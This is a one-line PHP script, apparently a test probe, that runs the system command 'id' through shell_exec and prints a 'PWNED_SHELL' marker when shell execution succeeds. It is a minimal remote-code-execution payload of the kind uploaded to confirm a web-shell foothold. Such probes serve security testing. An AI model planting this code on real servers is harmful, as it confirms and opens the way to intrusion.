<?php $r=@shell_exec("id");if($r){echo "PWNED_SHELL ".$r;exit(0);}exit(1);
